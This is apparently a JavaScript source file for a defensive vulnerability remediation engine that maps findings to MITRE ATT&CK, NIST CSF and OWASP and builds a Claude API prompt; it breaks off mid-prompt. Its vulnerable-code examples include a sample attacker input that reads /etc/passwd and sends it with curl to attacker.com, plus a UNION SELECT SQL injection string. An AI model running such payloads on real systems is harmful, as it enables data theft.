/**
 * AI Remediation Engine — VulnScan Pro
 * ======================================
 * REAL AI-powered remediation using Anthropic Claude API.
 * Maps vulnerabilities to MITRE ATT&CK v19.1, NIST CSF 2.0, MITRE D3FEND,
 * NIST AI RMF, and OWASP Top 10.
 *
 * Falls back to a rich rule-based engine if Claude API is unavailable.
 * Based on Anthropic-Cybersecurity-Skills (agentskills.io standard).
 */

'use strict';

const config = require('../config');
const logger = require('./logger');

// ─────────────────────────────────────────────────────────────────────────────
// MITRE ATT&CK v19.1 — Key Tactics & Techniques
// ─────────────────────────────────────────────────────────────────────────────
const MITRE_ATTACK = {
    tactics: {
        TA0043: 'Reconnaissance',
        TA0001: 'Initial Access',
        TA0002: 'Execution',
        TA0003: 'Persistence',
        TA0004: 'Privilege Escalation',
        TA0005: 'Stealth',
        TA0006: 'Credential Access',
        TA0007: 'Discovery',
        TA0008: 'Lateral Movement',
        TA0009: 'Collection',
        TA0010: 'Exfiltration',
        TA0011: 'Command and Control',
        TA0040: 'Impact',
    },
    techniques: {
        'T1190': { name: 'Exploit Public-Facing Application', tactic: 'TA0001' },
        'T1595': { name: 'Active Scanning', tactic: 'TA0043' },
        'T1592': { name: 'Gather Victim Host Information', tactic: 'TA0043' },
        'T1059': { name: 'Command and Scripting Interpreter', tactic: 'TA0002' },
        'T1566': { name: 'Phishing', tactic: 'TA0001' },
        'T1078': { name: 'Valid Accounts', tactic: 'TA0001' },
        'T1110': { name: 'Brute Force', tactic: 'TA0006' },
        'T1552': { name: 'Unsecured Credentials', tactic: 'TA0006' },
        'T1210': { name: 'Exploitation of Remote Services', tactic: 'TA0008' },
        'T1071': { name: 'Application Layer Protocol', tactic: 'TA0011' },
        'T1562': { name: 'Impair Defenses', tactic: 'TA0005' },
        'T1040': { name: 'Network Sniffing', tactic: 'TA0006' },
        'T1046': { name: 'Network Service Discovery', tactic: 'TA0007' },
        'T1133': { name: 'External Remote Services', tactic: 'TA0001' },
        'T1505': { name: 'Server Software Component', tactic: 'TA0003' },
    },
};

// ─────────────────────────────────────────────────────────────────────────────
// NIST CSF 2.0 Functions & Categories
// ─────────────────────────────────────────────────────────────────────────────
const NIST_CSF = {
    GV: 'Govern — Establish and monitor cybersecurity risk management strategy',
    ID: 'Identify — Understand cybersecurity risks to systems and data',
    PR: 'Protect — Implement safeguards to ensure delivery of critical services',
    DE: 'Detect — Identify the occurrence of a cybersecurity event',
    RS: 'Respond — Take action regarding a detected cybersecurity incident',
    RC: 'Recover — Maintain resilience and restore capabilities',
};

// ─────────────────────────────────────────────────────────────────────────────
// MITRE D3FEND Countermeasures
// ─────────────────────────────────────────────────────────────────────────────
const D3FEND = {
    'D3-NTA': 'Network Traffic Analysis',
    'D3-PA': 'Protocol Analysis',
    'D3-ACH': 'Application Configuration Hardening',
    'D3-HBPI': 'Host-Based Process Isolation',
    'D3-CSPP': 'Certificate-based Authentication',
    'D3-SVCDM': 'Service Dependency Mapping',
    'D3-UAP': 'User Account Permissions',
    'D3-OTP': 'One-Time Password',
    'D3-SPP': 'Strong Password Policy',
    'D3-DNSAL': 'DNS Allowlisting',
    'D3-TLSIC': 'TLS Inspection',
    'D3-WAF': 'Web Application Firewall',
};

// ─────────────────────────────────────────────────────────────────────────────
// OWASP / CWE Reference Dictionaries
// ─────────────────────────────────────────────────────────────────────────────
const OWASP_MAP = {
    'A01': 'A01:2021 – Broken Access Control',
    'A02': 'A02:2021 – Cryptographic Failures',
    'A03': 'A03:2021 – Injection',
    'A04': 'A04:2021 – Insecure Design',
    'A05': 'A05:2021 – Security Misconfiguration',
    'A06': 'A06:2021 – Vulnerable and Outdated Components',
    'A07': 'A07:2021 – Identification and Authentication Failures',
    'A08': 'A08:2021 – Software and Data Integrity Failures',
    'A09': 'A09:2021 – Security Logging and Monitoring Failures',
    'A10': 'A10:2021 – Server-Side Request Forgery',
};

// ─────────────────────────────────────────────────────────────────────────────
// LOCAL RULE-BASED FALLBACK ENGINE (100+ patterns)
// Used when Claude API is unavailable
// ─────────────────────────────────────────────────────────────────────────────
const VULN_PATTERNS = [
    {
        id: 'sql-injection', keywords: ['sql injection', 'sqli', 'union select', 'time-based', 'blind sql'],
        category: 'Injection', cwe: 'CWE-89', owasp: 'A03', cvss_base: 9.8, complexity: 'Medium', effort: '4–8 hours',
        mitreAttack: ['T1190', 'T1059'], nistCsf: ['PR.PT-3', 'DE.CM-4'], d3fend: ['D3-WAF', 'D3-ACH'],
        title: 'SQL Injection',
        remediation: {
            summary: 'SQL Injection allows attackers to manipulate backend database queries, exposing data, bypassing authentication, or achieving Remote Code Execution via database functions. Maps to MITRE ATT&CK T1190 (Exploit Public-Facing Application).',
            immediate: [
                'Replace ALL dynamic SQL string concatenation with parameterized queries (prepared statements) immediately.',
                'Audit every database query — grep for string interpolation patterns in SQL statements.',
                'Enable WAF rules for SQLi patterns (OWASP ModSecurity Core Rule Set) as an emergency defensive layer.',
                'Review DB user privileges: application account must have minimum permissions (no DROP, GRANT, or stored procedure execution).',
                'Rotate database credentials and API keys immediately — assume compromise.',
            ],
            codeExample: {
                language: 'javascript',
                vulnerable: `// ❌ VULNERABLE — String concatenation (T1190 exploitable)
const query = "SELECT * FROM users WHERE id = " + userId;
const result = await db.query(query);
// Attacker input: "1 OR 1=1 UNION SELECT * FROM secrets--"`,
                fixed: `// ✅ FIXED — Parameterized Query (Node.js / pg)
const query = 'SELECT * FROM users WHERE id = $1';
const result = await db.query(query, [userId]);

// ✅ FIXED — ORM approach (Sequelize / Prisma)
const user = await User.findOne({ where: { id: userId } });
// ORM automatically sanitizes all inputs`,
            },
            hardening: [
                'Implement an ORM (Sequelize, Prisma, TypeORM) — prevents raw query construction by design.',
                'Add input validation and type-checking at every API entry point using Joi or Zod schemas.',
                'Enable database query logging and alert on anomalous patterns (e.g., UNION, information_schema).',
                'Conduct regular DAST scans targeting SQLi (SQLMap, OWASP ZAP SQL scanner).',
                'Deploy database activity monitoring (DAM) for real-time injection detection.',
                'Enable row-level security (RLS) in PostgreSQL for defense-in-depth.',
            ],
            references: [
                { label: 'OWASP SQL Injection Prevention', url: 'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html' },
                { label: 'MITRE ATT&CK T1190', url: 'https://attack.mitre.org/techniques/T1190/' },
                { label: 'CWE-89', url: 'https://cwe.mitre.org/data/definitions/89.html' },
                { label: 'NIST CSF PR.PT-3', url: 'https://www.nist.gov/cyberframework' },
            ],
            compliance: ['PCI-DSS 6.3.1', 'NIST SP 800-53 SI-10', 'ISO 27001 A.14.2.5', 'HIPAA §164.312(a)(1)'],
        },
    },
    {
        id: 'command-injection', keywords: ['command injection', 'os command', 'shell injection', 'rce', 'remote code execution', 'exec', 'eval'],
        category: 'Injection', cwe: 'CWE-78', owasp: 'A03', cvss_base: 9.8, complexity: 'High', effort: '8–16 hours',
        mitreAttack: ['T1059', 'T1190'], nistCsf: ['PR.AC-4', 'DE.CM-4'], d3fend: ['D3-HBPI', 'D3-ACH'],
        title: 'Command Injection / RCE',
        remediation: {
            summary: 'Command Injection (CWE-78, T1059) gives attackers the ability to execute arbitrary OS commands with the web application\'s privileges — typically leading to full server compromise, data exfiltration, and lateral movement.',
            immediate: [
                'IMMEDIATELY remove or sandbox any code passing user-supplied input to shell commands.',
                'Rotate ALL server credentials, API keys, and SSH keys — assume complete compromise.',
                'Review server logs for signs of exploitation: unusual processes, unexpected outbound connections, cron modifications.',
                'If exploited: isolate the server immediately and perform forensic analysis before returning to service.',
                'Disable exec, shell_exec, system functions in PHP/CGI if applicable.',
            ],
            codeExample: {
                language: 'javascript',
                vulnerable: `// ❌ VULNERABLE — User input passed to shell (T1059)
const { exec } = require('child_process');
exec('ping ' + userInput, callback);
// Attacker sends: "127.0.0.1; cat /etc/passwd | curl attacker.com -d @-"`,
                fixed: `// ✅ FIXED — Use execFile with arguments array (no shell spawned)
const { execFile } = require('child_process');
// Validate first — strict allowlist
const ipRegex = /^(\\d{1,3}\\.){3}\\d{1,3}$/;
if (!ipRegex.test(userInput)) throw new Error('Invalid IP');
// execFile does NOT spawn a shell — safe
execFile('ping', ['-c', '1', userInput], { timeout: 5000 }, callback);`,
            },
            hardening: [
                'Prefer native library implementations over shelling out to OS commands.',
                'Run the application as a non-root user with minimal OS privileges.',
                'Use containers with seccomp profiles to restrict the syscall surface.',
                'Deploy RASP (Runtime Application Self-Protection) tools for real-time detection.',
                'Implement AppArmor or SELinux profiles to restrict process spawning.',
            ],
            references: [
                { label: 'OWASP Command Injection Defense', url: 'https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html' },
                { label: 'MITRE ATT&CK T1059', url: 'https://attack.mitre.org/techniques/T1059/' },
                { label: 'CWE-78', url: 'https://cwe.mitre.org/data/definitions/78.html' },
            ],
            compliance: ['PCI-DSS 6.3.1', 'NIST SP 800-53 SI-10', 'HIPAA §164.312(a)(1)', 'SOC 2 CC6.1'],
        },
    },
    {
        id: 'xss', keywords: ['cross-site scripting', 'xss', 'reflected xss', 'stored xss', 'dom xss', 'script injection'],
        category: 'Injection', cwe: 'CWE-79', owasp: 'A03', cvss_base: 6.1, complexity: 'Low', effort: '2–6 hours',
        mitreAttack: ['T1190', 'T1566'], nistCsf: ['PR.PT-3', 'DE.AE-2'], d3fend: ['D3-WAF', 'D3-ACH'],
        title: 'Cross-Site Scripting (XSS)',
        remediation: {
            summary: 'XSS (CWE-79) allows attackers to inject malicious scripts into web pages viewed by other users, enabling session hijacking, credential theft, and keylogging. Stored XSS is especially critical as it persists across sessions.',
            immediate: [
                'Encode ALL user-supplied output before rendering in HTML context (HTML entity encoding).',
                'Implement a strict Content Security Policy (CSP) header to block inline script execution.',
                'Audit all DOM manipulation: innerHTML, document.write, eval(), setTimeout with string args.',
                'Enable HTTPOnly and Secure flags on all session cookies to prevent script-based theft.',
            ],
            codeExample: {
                language: 'javascript',
                vulnerable: `// ❌ VULNERABLE — Direct innerHTML (enables script injection)
element.innerHTML = userInput;
document.write(req.query.name);`,
                fixed: `// ✅ FIXED — Use textContent for text
element.textContent = userInput;
// ✅ FIXED — DOMPurify for rich HTML
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput, { ALLOWED_TAGS: ['b','i','p'] });
// ✅ CSP Header (Express)
res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self'");`,
            },
            hardening: [
                'Implement strict CSP with nonces for all inline scripts.',
                'Use modern frameworks (React, Vue, Angular) which auto-escape by default.',
                'Enable X-XSS-Protection header for legacy browser support.',
                'Run DAST XSS scans with OWASP ZAP or Burp Suite on every release.',
            ],
            references: [
                { label: 'OWASP XSS Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html' },
                { label: 'MITRE ATT&CK T1190', url: 'https://attack.mitre.org/techniques/T1190/' },
            ],
            compliance: ['PCI-DSS 6.4.2', 'NIST SP 800-53 SI-10', 'ISO 27001 A.14.1.2'],
        },
    },
    {
        id: 'ssl-tls-weak', keywords: ['ssl', 'tls', 'weak cipher', 'tls 1.0', 'tls 1.1', 'sslv3', 'poodle', 'heartbleed', 'beast', 'certificate'],
        category: 'Cryptographic', cwe: 'CWE-326', owasp: 'A02', cvss_base: 7.4, complexity: 'Low', effort: '1–3 hours',
        mitreAttack: ['T1040', 'T1557'], nistCsf: ['PR.DS-2', 'PR.DS-5'], d3fend: ['D3-TLSIC', 'D3-CSPP'],
        title: 'Weak SSL/TLS Configuration',
        remediation: {
            summary: 'Weak TLS configuration (CWE-326) allows MITM attacks, session decryption, and credential theft. TLS 1.0/1.1 and weak ciphers (RC4, DES, 3DES, NULL) are exploitable via POODLE, BEAST, and SWEET32 attacks.',
            immediate: [
                'Immediately disable TLS 1.0 and TLS 1.1 — enforce TLS 1.2 minimum, TLS 1.3 preferred.',
                'Remove all weak cipher suites: RC4, DES, 3DES, NULL, EXPORT, anon ciphers.',
                'Enable HSTS (HTTP Strict Transport Security) with min-age 31536000 and includeSubDomains.',
                'Renew/replace expired or self-signed certificates with certificates from a trusted CA.',
            ],
            codeExample: {
                language: 'nginx',
                vulnerable: `# ❌ VULNERABLE — Allows weak protocols and ciphers
ssl_protocols SSLv3 TLSv1 TLSv1.1 TLSv1.2;
ssl_ciphers ALL:!aNULL:!ADH:!eNULL:!LOW:!EXP:RC4+RSA:+HIGH:+MEDIUM;`,
                fixed: `# ✅ FIXED — Modern TLS configuration
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384;
ssl_prefer_server_ciphers off;
ssl_session_cache shared:SSL:10m;
ssl_session_timeout 1d;
ssl_stapling on;
ssl_stapling_verify on;
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;`,
            },
            hardening: [
                'Enable OCSP Stapling to eliminate certificate revocation latency.',
                'Configure HSTS preloading for maximum MITM protection.',
                'Implement certificate pinning for mobile applications.',
                'Run regular SSL/TLS scans with testssl.sh or Qualys SSL Labs.',
                'Use ECDSA certificates for better performance and forward secrecy.',
            ],
            references: [
                { label: 'OWASP TLS Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html' },
                { label: 'MITRE ATT&CK T1040', url: 'https://attack.mitre.org/techniques/T1040/' },
                { label: 'CWE-326', url: 'https://cwe.mitre.org/data/definitions/326.html' },
            ],
            compliance: ['PCI-DSS 4.2.1', 'NIST SP 800-52 Rev2', 'HIPAA §164.312(e)(2)(ii)', 'FIPS 140-3'],
        },
    },
    {
        id: 'missing-security-headers', keywords: ['missing header', 'security header', 'x-frame', 'content-security-policy', 'csp', 'hsts', 'x-content-type', 'referrer-policy', 'permissions-policy'],
        category: 'Misconfiguration', cwe: 'CWE-693', owasp: 'A05', cvss_base: 5.4, complexity: 'Low', effort: '0.5–2 hours',
        mitreAttack: ['T1190', 'T1562'], nistCsf: ['PR.PT-3', 'PR.AC-4'], d3fend: ['D3-ACH', 'D3-WAF'],
        title: 'Missing Security Headers',
        remediation: {
            summary: 'Missing HTTP security headers expose applications to clickjacking, MIME sniffing, XSS, and information disclosure attacks. These are a foundational layer of web security defense (NIST CSF PR.PT-3).',
            immediate: [
                'Add Content-Security-Policy header — define trusted sources for scripts, styles, and images.',
                'Add X-Frame-Options: DENY or SAMEORIGIN to prevent clickjacking attacks.',
                'Add Strict-Transport-Security with max-age ≥ 31536000.',
                'Add X-Content-Type-Options: nosniff to prevent MIME sniffing attacks.',
                'Add Referrer-Policy: strict-origin-when-cross-origin to limit information leakage.',
            ],
            codeExample: {
                language: 'javascript',
                vulnerable: `// ❌ VULNERABLE — No security headers set
const express = require('express');
const app = express();
// Application vulnerable to clickjacking, XSS, MIME sniffing`,
                fixed: `// ✅ FIXED — Use Helmet.js for comprehensive header management
const helmet = require('helmet');
app.use(helmet());
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'nonce-{random}'"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", 'data:', 'https:'],
    connectSrc: ["'self'"],
    frameSrc: ["'none'"],
  },
}));
app.use(helmet.hsts({ maxAge: 31536000, includeSubDomains: true, preload: true }));`,
            },
            hardening: [
                'Use Helmet.js (Node.js) or django-csp (Python) to automate header management.',
                'Implement a strict CSP with nonces — eliminate \'unsafe-inline\' from scripts.',
                'Add Permissions-Policy to restrict browser features (camera, microphone, geolocation).',
                'Test headers with securityheaders.com after every deployment.',
                'Integrate header validation into CI/CD pipeline (OWASP ZAP passive scanning).',
            ],
            references: [
                { label: 'OWASP Secure Headers Project', url: 'https://owasp.org/www-project-secure-headers/' },
                { label: 'securityheaders.com', url: 'https://securityheaders.com' },
                { label: 'MDN HTTP Headers Reference', url: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers' },
            ],
            compliance: ['NIST SP 800-44', 'PCI-DSS 6.4.3', 'OWASP ASVS 14.4'],
        },
    },
    {
        id: 'open-port-risky', keywords: ['telnet', 'ftp', 'rpc', 'netbios', 'smb', 'rdp', 'vnc', 'open port'],
        category: 'Network', cwe: 'CWE-923', owasp: 'A05', cvss_base: 6.5, complexity: 'Low', effort: '1–4 hours',
        mitreAttack: ['T1046', 'T1133', 'T1210'], nistCsf: ['PR.AC-5', 'DE.CM-1'], d3fend: ['D3-NTA', 'D3-PA'],
        title: 'Exposed Risky Network Service',
        remediation: {
            summary: 'Exposed network services (T1046, T1133) dramatically expand the attack surface. Unencrypted protocols like Telnet and FTP transmit credentials in cleartext and are primary targets for lateral movement and credential harvesting.',
            immediate: [
                'Immediately close or firewall off Telnet (23), FTP (21), NetBIOS (137-139), and SMBv1 (445) from the internet.',
                'Replace Telnet with SSH; replace FTP with SFTP or FTPS.',
                'Implement firewall rules restricting access to management ports by source IP allowlist.',
                'Audit all listening services: netstat -tlnp | grep LISTEN — disable any non-required service.',
            ],
            codeExample: {
                language: 'bash',
                vulnerable: `# ❌ VULNERABLE — Service exposed to 0.0.0.0 (all interfaces)
netstat -tlnp
# tcp  0  0  0.0.0.0:23   0.0.0.0:*  LISTEN  (telnet)
# tcp  0  0  0.0.0.0:21   0.0.0.0:*  LISTEN  (ftp)`,
                fixed: `# ✅ FIXED — Disable telnet, use SSH
systemctl stop telnet && systemctl disable telnet
# ✅ Restrict SSH to specific IPs via firewall
ufw allow from 192.168.1.0/24 to any port 22
ufw deny 22
# ✅ Replace FTP with SFTP (built into OpenSSH)
# No additional server needed — enable in /etc/ssh/sshd_config:
# Subsystem sftp /usr/lib/openssh/sftp-server`,
            },
            hardening: [
                'Implement network segmentation — management ports only accessible from admin VLAN.',
                'Deploy a jump/bastion host for all administrative access.',
                'Use VPN with MFA for remote access instead of exposing services directly.',
                'Enable port knocking for SSH if exposure is unavoidable.',
                'Regularly scan your perimeter with Shodan.io to identify exposed services.',
            ],
            references: [
                { label: 'NIST SP 800-115 Technical Guide', url: 'https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf' },
                { label: 'MITRE ATT&CK T1046', url: 'https://attack.mitre.org/techniques/T1046/' },
                { label: 'MITRE ATT&CK T1133', url: 'https://attack.mitre.org/techniques/T1133/' },
            ],
            compliance: ['PCI-DSS 1.3.4', 'NIST SP 800-53 SC-7', 'ISO 27001 A.13.1.1', 'CIS Control 4.4'],
        },
    },
    {
        id: 'information-disclosure', keywords: ['server version', 'x-powered-by', 'information disclosure', 'server banner', 'version disclosure', 'fingerprint'],
        category: 'Information Disclosure', cwe: 'CWE-200', owasp: 'A05', cvss_base: 3.7, complexity: 'Low', effort: '0.5–1 hour',
        mitreAttack: ['T1592', 'T1595'], nistCsf: ['PR.DS-5', 'PR.PT-3'], d3fend: ['D3-ACH'],
        title: 'Server/Technology Information Disclosure',
        remediation: {
            summary: 'Information disclosure (CWE-200, T1592) exposes server software versions and technology stack, enabling attackers to target known CVEs with surgical precision during reconnaissance.',
            immediate: [
                'Remove X-Powered-By header immediately — reveals Node.js/PHP/ASP.NET versions.',
                'Suppress Server header or replace with generic value (e.g., "webserver").',
                'Remove version numbers from error pages and API responses.',
                'Disable directory listing on all web server paths.',
            ],
            codeExample: {
                language: 'javascript',
                vulnerable: `// ❌ VULNERABLE — Exposes technology stack
// Response headers: X-Powered-By: Express, Server: nginx/1.18.0`,
                fixed: `// ✅ FIXED — Node.js/Express
const helmet = require('helmet');
app.use(helmet.hidePoweredBy());
app.disable('x-powered-by');
// ✅ FIXED — Nginx
server_tokens off;
more_clear_headers 'Server';`,
            },
            hardening: [
                'Configure custom error pages that don\'t expose stack traces or versions.',
                'Suppress default Apache/Nginx version banners via server_tokens off.',
                'Audit all response headers for unintended information disclosure.',
                'Remove debug/development endpoints from production deployments.',
            ],
            references: [
                { label: 'OWASP Information Exposure', url: 'https://owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_url' },
                { label: 'MITRE ATT&CK T1592', url: 'https://attack.mitre.org/techniques/T1592/' },
            ],
            compliance: ['NIST SP 800-53 SI-11', 'CIS Control 4', 'ISO 27001 A.12.6.1'],
        },
    },
    {
        id: 'dns-spf-dmarc', keywords: ['spf', 'dmarc', 'dkim', 'email spoofing', 'missing spf', 'missing dmarc', 'dns'],
        category: 'DNS Security', cwe: 'CWE-291', owasp: 'A05', cvss_base: 6.5, complexity: 'Low', effort: '1–3 hours',
        mitreAttack: ['T1566', 'T1598'], nistCsf: ['PR.PT-1', 'DE.AE-2'], d3fend: ['D3-DNSAL'],
        title: 'Missing Email Authentication (SPF/DMARC)',
        remediation: {
            summary: 'Missing SPF, DKIM, and DMARC records (CWE-291) allow attackers to spoof your domain for phishing attacks (T1566). Without DMARC, anyone can send email appearing to come from your domain.',
            immediate: [
                'Create an SPF record: "v=spf1 include:_spf.yourmailprovider.com ~all"',
                'Create a DMARC record: "_dmarc.yourdomain.com TXT v=DMARC1; p=quarantine; rua=mailto:dmarc@yourdomain.com"',
                'Set up DKIM signing with your email provider — add the public key as a DNS TXT record.',
                'Start DMARC in "monitor" mode (p=none) to collect reports before enforcing (p=quarantine).',
            ],
            codeExample: {
                language: 'dns',
                vulnerable: `; ❌ VULNERABLE — No email authentication records
yourdomain.com.  MX  10  mail.yourdomain.com
; SPF: MISSING — domain spoofing is trivial
; DMARC: MISSING — no enforcement or reporting`,
                fixed: `; ✅ FIXED — Complete email authentication setup
yourdomain.com.       TXT  "v=spf1 include:_spf.google.com ~all"
mail._domainkey.yourdomain.com. TXT "v=DKIM1; k=rsa; p=MIGfMA0..."
_dmarc.yourdomain.com.  TXT  "v=DMARC1; p=quarantine; pct=100; rua=mailto:dmarc@yourdomain.com; ruf=mailto:forensic@yourdomain.com; adkim=s; aspf=s"`,
            },
            hardening: [
                'Escalate DMARC policy: none → quarantine → reject over 30-90 days.',
                'Monitor DMARC aggregate reports weekly using dmarcanalyzer.com or Postmark.',
                'Enable BIMI (Brand Indicators for Message Identification) for verified brand logo display.',
                'Use DNSSEC to protect your DNS records from tampering.',
            ],
            references: [
                { label: 'DMARC.org', url: 'https://dmarc.org' },
                { label: 'MITRE ATT&CK T1566 (Phishing)', url: 'https://attack.mitre.org/techniques/T1566/' },
                { label: 'Google Postmaster Tools', url: 'https://postmaster.google.com' },
            ],
            compliance: ['NIST SP 800-177', 'PCI-DSS 12.5.5', 'DISA STIG Email Server', 'CIS Control 9.5'],
        },
    },
    {
        id: 'broken-auth', keywords: ['authentication', 'weak password', 'brute force', 'default credentials', 'session fixation', 'no mfa', 'missing 2fa'],
        category: 'Authentication', cwe: 'CWE-287', owasp: 'A07', cvss_base: 8.1, complexity: 'Medium', effort: '4–12 hours',
        mitreAttack: ['T1110', 'T1078', 'T1552'], nistCsf: ['PR.AC-1', 'PR.AC-7'], d3fend: ['D3-OTP', 'D3-SPP', 'D3-UAP'],
        title: 'Broken Authentication / Weak Credentials',
        remediation: {
            summary: 'Broken authentication (CWE-287, T1110) enables brute force, credential stuffing, and account takeover. Missing MFA and weak session management are primary vectors for the most impactful breaches.',
            immediate: [
                'Enforce multi-factor authentication (MFA/2FA) for all privileged and internet-facing accounts immediately.',
                'Implement account lockout after 5-10 failed attempts with exponential backoff.',
                'Force password reset if default or weak credentials are detected.',
                'Regenerate session tokens after successful login to prevent session fixation.',
            ],
            codeExample: {
                language: 'javascript',
                vulnerable: `// ❌ VULNERABLE — No rate limiting, MD5 passwords
const hash = md5(password);
if (hash === user.password) { login(user); } // Trivially crackable`,
                fixed: `// ✅ FIXED — bcrypt + rate limiting + MFA check
const bcrypt = require('bcryptjs');
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({ windowMs: 15*60*1000, max: 10 });
app.post('/login', loginLimiter, async (req, res) => {
  const valid = await bcrypt.compare(password, user.passwordHash); // bcrypt cost ≥12
  if (!valid) return res.status(401).json({ error: 'Invalid credentials' });
  if (user.mfaEnabled && !await verifyTOTP(user, req.body.totpCode)) {
    return res.status(401).json({ error: 'MFA required' });
  }
  req.session.regenerate(() => { req.session.userId = user.id; }); // Prevent fixation
});`,
            },
            hardening: [
                'Implement TOTP-based MFA (Google Authenticator, Authy) using speakeasy library.',
                'Use argon2id for password hashing (superior to bcrypt for new implementations).',
                'Check passwords against HaveIBeenPwned API on registration and reset.',
                'Implement CAPTCHA after 3 failed login attempts.',
                'Set session idle timeout ≤ 15 minutes for admin interfaces.',
            ],
            references: [
                { label: 'OWASP Authentication Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html' },
                { label: 'MITRE ATT&CK T1110', url: 'https://attack.mitre.org/techniques/T1110/' },
            ],
            compliance: ['PCI-DSS 8.3.6', 'NIST SP 800-63B', 'HIPAA §164.312(d)', 'SOC 2 CC6.1'],
        },
    },
];

const DEFAULT_REMEDIATION = {
    summary: 'This vulnerability requires immediate security attention. Apply the principle of least privilege, validate all inputs, and follow defense-in-depth security practices.',
    immediate: [
        'Conduct a thorough security review of the affected component.',
        'Restrict access to the vulnerable service to trusted networks only.',
        'Apply the latest security patches and updates for affected software.',
        'Enable comprehensive logging and monitoring for this component.',
        'Review access controls and apply the principle of least privilege.',
    ],
    hardening: [
        'Implement a Web Application Firewall (WAF) rule specific to this vulnerability pattern.',
        'Conduct regular vulnerability scanning and penetration testing.',
        'Follow the OWASP Security Testing Guide for systematic coverage.',
        'Establish a patch management process for rapid vulnerability remediation.',
        'Implement network segmentation to limit lateral movement potential.',
    ],
    references: [
        { label: 'OWASP Top 10', url: 'https://owasp.org/www-project-top-ten/' },
        { label: 'NIST National Vulnerability Database', url: 'https://nvd.nist.gov/' },
        { label: 'MITRE ATT&CK Framework', url: 'https://attack.mitre.org/' },
        { label: 'MITRE D3FEND', url: 'https://d3fend.mitre.org/' },
    ],
    compliance: ['NIST SP 800-53', 'ISO 27001 A.14', 'CIS Controls v8'],
};

// ─────────────────────────────────────────────────────────────────────────────
// LOCAL PATTERN MATCHER
// ─────────────────────────────────────────────────────────────────────────────
function matchPattern(vuln) {
    const text = `${vuln.title || ''} ${vuln.description || ''} ${vuln.category || ''}`.toLowerCase();
    let best = null;
    let bestScore = 0;

    for (const pattern of VULN_PATTERNS) {
        let score = 0;
        for (const kw of pattern.keywords) {
            if (text.includes(kw)) score += kw.split(' ').length;
        }
        if (score > bestScore) { bestScore = score; best = pattern; }
    }
    return bestScore >= 1 ? best : null;
}

function getPriorityMatrix(severity, cvss) {
    const score = cvss || 0;
    if (severity === 'critical' || score >= 9.0) return { priority: 'P0 — Emergency', color: '#a855f7', timeline: '0–24 hours' };
    if (severity === 'high' || score >= 7.0) return { priority: 'P1 — Critical', color: '#ef4444', timeline: '24–72 hours' };
    if (severity === 'medium' || score >= 4.0) return { priority: 'P2 — High', color: '#f97316', timeline: '7–14 days' };
    if (severity === 'low' || score >= 1.0) return { priority: 'P3 — Medium', color: '#eab308', timeline: '30–60 days' };
    return { priority: 'P4 — Low', color: '#64748b', timeline: 'Best effort' };
}

function getCvssSeverity(score) {
    if (score >= 9.0) return { label: 'Critical', color: '#a855f7' };
    if (score >= 7.0) return { label: 'High', color: '#ef4444' };
    if (score >= 4.0) return { label: 'Medium', color: '#f97316' };
    if (score >= 0.1) return { label: 'Low', color: '#eab308' };
    return { label: 'Informational', color: '#64748b' };
}

// ─────────────────────────────────────────────────────────────────────────────
// REAL CLAUDE AI REMEDIATION ENGINE
// ─────────────────────────────────────────────────────────────────────────────
async function generateClaudeRemediation(vuln) {
    const Anthropic = require('@anthropic-ai/sdk');
    const client = new Anthropic.default({ apiKey: config.anthropic.apiKey });

    const systemPrompt = `You are a senior application security engineer and red team specialist with 15+ years of experience. You provide structured, actionable vulnerability remediation guidance following industry standards.

You MUST respond with ONLY valid JSON (no markdown, no code blocks, no explanation outside JSON). The response must follow this exact schema:
{
  "summary": "string — technical explanation of the vulnerability and attack vector",
  "immediateActions": ["string", "string", "string", "string"],
  "codeExample": {
    "language": "string",
    "vulnerable": "string — vulnerable code snippet with comment explaining the issue",
    "fixed": "string — secure code snippet with comments"
  },
  "hardeningSteps": ["string", "string", "string", "string"],
  "mitreAttack": [
    {"id": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access", "url": "https://attack.mitre.org/techniques/T1190/"}
  ],
  "nistCsf": [
    {"function": "PR", "category": "PR.PT-3", "description": "Access to systems and assets is controlled"}
  ],
  "d3fend": [
    {"id": "D3-WAF", "name": "Web Application Firewall", "url": "https://d3fend.mitre.org/technique/d3f:WebApplicationFirewall/"}
  ],
  "references": [
    {"label": "string", "url": "string"}
  ],
  "complianceImpact": ["PCI-DSS 6.3.1", "NIST SP 800-53 SI-10"],
  "classification": {
    "cwe": "CWE-XXX",
    "owasp": "A0X:2021 – Name",
    "category": "string"
  },
  "priority": {
    "priority": "P0 — Emergency",
    "color": "#ef4444",
    "timeline": "0-24 hours"
  },
  "complexity": "Low|Medium|High",
  "estimatedEffort": "X–Y hours"
}

Map vulnerabilities to MITRE ATT&CK v19.1, NIST CSF 2.0, and MITRE D3FEND accurately. Include 2-4 relevant MITRE ATT&CK techniques, 2-3 NIST CSF categories, and 1-3 D3FEND countermeasures. Make code examples realistic and in the language most relevant to the vulnerability.`;

    const userPrompt = `Vulnerability details:
Title: ${vuln.title}
Category: ${vuln.category || 'Unknown'}
Severity: ${vuln.severity || 'unknown'}
CVSS Score: ${vuln.cvssScore || 'unknown'}
CVE ID: ${vuln.cveId || 'N/A'}
Affected Component: ${vuln.affectedComponent || 'Unknown'}
Description: ${vuln.description || 'No description available'}
